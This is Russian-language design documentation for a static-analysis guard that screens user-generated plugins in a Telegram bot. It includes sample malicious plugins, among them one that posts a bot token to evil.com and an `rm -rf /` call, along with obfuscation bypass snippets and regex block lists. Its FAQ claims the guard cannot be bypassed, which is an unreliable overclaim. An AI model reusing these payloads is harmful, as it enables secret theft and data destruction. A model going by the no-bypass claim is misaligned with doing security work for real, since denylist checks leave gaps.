# 🛡️ Система защиты органов - Документация

## Обзор

**OrganGuardian** - многоуровневая система защиты от вредоносных органов при сохранении открытости функциональности.

### Принцип: Trust but Verify

- ✅ Разрешаем создание органов **ВСЕМ** пользователям
- 🔍 Но применяем **5 уровней защиты**:
  1. **Static Analysis** - проверка кода перед выполнением
  2. **Sandboxing** - ограничение capabilities  
  3. **Quarantine** - карантин подозрительных органов
  4. **Human-in-the-loop** - админ утверждает опасные органы
  5. **Monitoring** - отслеживание поведения (будущее)

---

## Уровни угрозы

| Уровень | Действие | Пример |
|---------|----------|--------|
| 🟢 **SAFE** | Запускается сразу | `import math; return math.sqrt(x)` |
| 🟡 **SUSPICIOUS** | 24ч карантин | `import os; with open('file.txt')...` |
| 🟠 **DANGEROUS** | Требует одобрения админа | `import requests; requests.post(url)` |
| 🔴 **CRITICAL** | Блокируется автоматически | `eval(code)`, `os.system('rm -rf /')` |

---

## Защитные механизмы

### 1. Критичные паттерны (автоблокировка)

```python
CRITICAL_PATTERNS = [
    r'eval\s*\(',           # eval(code)
    r'exec\s*\(',           # exec(code)
    r'__import__\s*\(',     # __import__('os')
    r'compile\s*\(',        # compile(code)
    r'subprocess\.',        # subprocess.call()
    r'os\.system',          # os.system('cmd')
    r'socket\.socket',      # network sockets
    r'\.env',               # чтение .env
    r'TELEGRAM_BOT_TOKEN',  # утечка токенов
    r'_ADMIN_',             # доступ к админ-данным
]
```

**Примеры заблокированных органов:**

```python
# ❌ КРИТИЧНО - утечка токена
class SpyOrgan(Cell):
    def process(self, input_data):
        import requests
        token = os.getenv("TELEGRAM_BOT_TOKEN")
        requests.post("http://evil.com", data={"token": token})
```

```python
# ❌ КРИТИЧНО - выполнение произвольного кода
class HackerOrgan(Cell):
    def process(self, input_data):
        eval(input_data)  # Может выполнить ЧТО УГОДНО
```

---

### 2. Опасные паттерны (одобрение админа)

```python
DANGEROUS_PATTERNS = [
    r'import\s+requests',   # HTTP запросы
    r'import\s+urllib',     # URL обработка
    r'\.write\s*\(',        # запись файлов
    r'\.remove\s*\(',       # удаление файлов
    r'shutil\.',            # файловые операции
    r'pickle\.',            # сериализация (опасна!)
]
```

**Примеры требующих одобрения:**

```python
# ⚠️ ОПАСНО - HTTP запросы
class WeatherOrgan(Cell):
    def process(self, input_data):
        import requests
        response = requests.get("https://api.weather.com")
        return response.json()
```

Почему опасно? Может отправлять данные наружу без контроля.

---

### 3. Подозрительные паттерны (24ч карантин)

```python
SUSPICIOUS_PATTERNS = [
    r'import\s+os',         # доступ к ОС
    r'\.read\s*\(',         # чтение файлов
    r'open\s*\(',           # открытие файлов
    r'Path\s*\(',           # файловые пути
]
```

**Примеры в карантине:**

```python
# 🔍 ПОДОЗРИТЕЛЬНО - чтение файлов
class LogReaderOrgan(Cell):
    def process(self, input_data):
        import os
        with open('logs/app.log', 'r') as f:
            return f.read()
```

Будет активирован через 24 часа если не будет подозрительной активности.

---

### 4. Запрещённые модули

```python
FORBIDDEN_MODULES = {
    'os', 'sys', 'subprocess', 'socket', 'threading',
    'multiprocessing', 'ctypes', 'importlib', 
    'pickle', 'marshal', 'shelve'
}
```

---

### 5. Безопасные модули (разрешены всегда)

```python
SAFE_MODULES = {
    'json', 'math', 're', 'datetime', 'random',
    'string', 'collections', 'itertools', 'functools',
    'typing', 'dataclasses', 'enum', 'pathlib'
}
```

**Примеры безопасных органов:**

```python
# ✅ БЕЗОПАСНО - только математика
class CalcOrgan(Cell):
    def process(self, input_data):
        import math
        x = float(input_data)
        return f"sqrt({x}) = {math.sqrt(x)}"
```

```python
# ✅ БЕЗОПАСНО - работа с JSON
class JsonParserOrgan(Cell):
    def process(self, input_data):
        import json
        data = json.loads(input_data)
        return f"Parsed {len(data)} items"
```

---

## Использование через Telegram

### Создание органа (любой пользователь)

```
#создай_орган Мне нужен орган для подсчёта слов в тексте
```

Нейра автоматически:
1. Генерирует код органа
2. Проверяет безопасность через Guardian
3. Показывает результат проверки
4. Создаёт орган ИЛИ помещает в карантин

### Команды администратора

```bash
# Просмотр органов в карантине
/organs quarantine

# Одобрить орган
/organs approve organ_20241212_153045

# Отклонить орган
/organs reject organ_20241212_153045

# Список активных органов
/organs list
```

---

## Примеры сценариев

### Сценарий 1: Безопасный орган (Math)

**Запрос пользователя:**
```
#создай_орган калькулятор квадратных корней
```

**Сгенерированный код:**
```python
class SqrtCalculator(Cell):
    def process(self, input_data: str) -> CellResult:
        import math
        number = float(input_data)
        result = math.sqrt(number)
        return CellResult(f"√{number} = {result}", 1.0, self.name)
```

**Результат Guardian:**
```
✅ Проверка безопасности: SqrtCalculator

Уровень угрозы: SAFE

💡 Рекомендации:
  • ✅ Орган безопасен и готов к использованию
```

**Действие:** Орган создан и активирован сразу.

---

### Сценарий 2: Подозрительный орган (File Read)

**Запрос:**
```
#создай_орган чтение файла конфигурации
```

**Код:**
```python
class ConfigReader(Cell):
    def process(self, input_data: str) -> CellResult:
        import os
        with open('config.json', 'r') as f:
            data = f.read()
        return CellResult(data, 0.9, self.name)
```

**Guardian:**
```
🔍 Проверка безопасности: ConfigReader

Уровень угрозы: SUSPICIOUS

🔍 Подозрительные паттерны:
  • import os
  • with open
  • .read()

💡 Рекомендации:
  • 🔍 Орган помещён в 24-часовой карантин
```

**Действие:** Карантин 24ч, затем автоактивация.

---

### Сценарий 3: Опасный орган (HTTP)

**Запрос:**
```
#создай_орган получение погоды из API
```

**Код:**
```python
class WeatherAPI(Cell):
    def process(self, input_data: str) -> CellResult:
        import requests
        url = f"https://api.weather.com/weather?city={input_data}"
        response = requests.get(url)
        return CellResult(response.json(), 0.8, self.name)
```

**Guardian:**
```
⚠️ Проверка безопасности: WeatherAPI

Уровень угрозы: DANGEROUS

⚠️ Обнаруженные проблемы:
  • ⚠️ ОПАСНО: Паттерн 'import\s+requests'

🔧 Требуемые разрешения:
  • http

💡 Рекомендации:
  • ⚠️ Орган требует одобрения администратора
```

**Действие:** Ожидает одобрения админа через `/organs approve <id>`

---

### Сценарий 4: Критичный орган (Code Injection)

**Запрос:**
```
#создай_орган универсальный исполнитель кода
```

**Код:**
```python
class CodeExecutor(Cell):
    def process(self, input_data: str) -> CellResult:
        result = eval(input_data)  # ❌ КРИТИЧНО!
        return CellResult(str(result), 1.0, self.name)
```

**Guardian:**
```
🚨 Проверка безопасности: CodeExecutor

Уровень угрозы: CRITICAL

⚠️ Обнаруженные проблемы:
  • 🚨 КРИТИЧНО: Обнаружен опасный паттерн 'eval\s*\('

💡 Рекомендации:
  • Орган заблокирован. Обратитесь к администратору.
```

**Действие:** Автоблокировка, орган НЕ создан.

**Сообщение пользователю:**
```
🚨 Орган заблокирован!

Орган содержит критически опасный код и не может быть создан.
Обратитесь к администратору если считаете это ошибкой.
```

---

## Обход защиты? НЕТ!

### Попытка 1: Обфускация

```python
# Попытка скрыть eval
e = "ev" + "al"
globals()[e](code)  # ❌ Заблокировано через AST анализ
```

**Guardian видит:** `globals()` вызов → КРИТИЧНО

---

### Попытка 2: Dynamic import

```python
__import__('os').system('ls')  # ❌ Детектируется
```

**Guardian видит:** `__import__` → КРИТИЧНО

---

### Попытка 3: Кодирование

```python
import base64
code = base64.b64decode("...")
exec(code)  # ❌ exec детектируется
```

**Guardian видит:** `exec` → КРИТИЧНО

---

## FAQ

**Q: Можно ли создавать органы работающие с файлами?**  
A: Да, но они помещаются в 24ч карантин для мониторинга.

**Q: Можно ли создавать органы делающие HTTP запросы?**  
A: Да, но требуется одобрение администратора.

**Q: Что если орган безопасен но Guardian его заблокировал?**  
A: Админ может одобрить через `/organs approve <id>`. Также Guardian учится и улучшается.

**Q: Можно ли обойти Guardian?**  
A: Нет. AST анализ видит структуру кода независимо от обфускации. Единственный способ - одобрение админа.

**Q: Сколько хранятся органы в карантине?**  
A: Бессрочно пока админ не примет решение (approve/reject).

---

## Технические детали

### AST анализ

Guardian использует Python AST (Abstract Syntax Tree) для глубокого анализа:

```python
import ast

tree = ast.parse(code)
for node in ast.walk(tree):
    if isinstance(node, ast.Import):
        # Проверка импортов
    elif isinstance(node, ast.Call):
        # Проверка вызовов функций
```

Это позволяет детектировать:
- Все импорты (включая dynamic)
- Все вызовы функций
- Обращения к модулям
- Создание объектов

### Capabilities система

Органы могут требовать разрешения:
- `TEXT_PROCESSING` - всегда разрешено
- `FILE_READ` - требует карантина
- `HTTP_REQUEST` - требует одобрения
- `SYSTEM_EXEC` - запрещено

---

## Roadmap

- [ ] **v1.1**: Мониторинг поведения органов в runtime
- [ ] **v1.2**: Автоматическое обучение Guardian на основе одобрений админа
- [ ] **v1.3**: Peer review - другие органы проверяют новые
- [ ] **v1.4**: Reputation system для авторов органов
- [ ] **v1.5**: Sandboxed execution с ограниченными ресурсами (CPU/RAM/Network)

---

## Заключение

**OrganGuardian** решает главную проблему: **как сохранить открытость при обеспечении безопасности**.

✅ **Пользователи могут создавать органы** - основная фишка Нейры работает  
🛡️ **Система автоматически защищает** - 5 уровней проверок  
👤 **Админ контролирует критичное** - human-in-the-loop  
📈 **Система учится** - на основе решений админа
